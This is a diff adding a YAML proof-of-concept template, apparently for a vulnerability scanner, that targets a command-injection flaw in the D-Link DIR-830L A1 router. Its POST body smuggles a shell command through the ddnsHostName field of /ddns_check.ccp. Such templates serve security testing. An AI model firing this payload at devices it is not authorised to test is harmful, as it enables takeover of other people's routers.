@@ -1,0 +1,10 @@
+name: dlinkDIR-830LA1-rce
+groups:
+  poc1:
+    - method: POST
+      path: /ddns_check.ccp
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: ccp_act=doCheck&ddnsHostName=;ls%20/>/www/test.html;&ddnsUsername=11&ddnsPassword=123456
+      expression: |
+        response.status == 200 && response.body.bcontains(b"<root>")
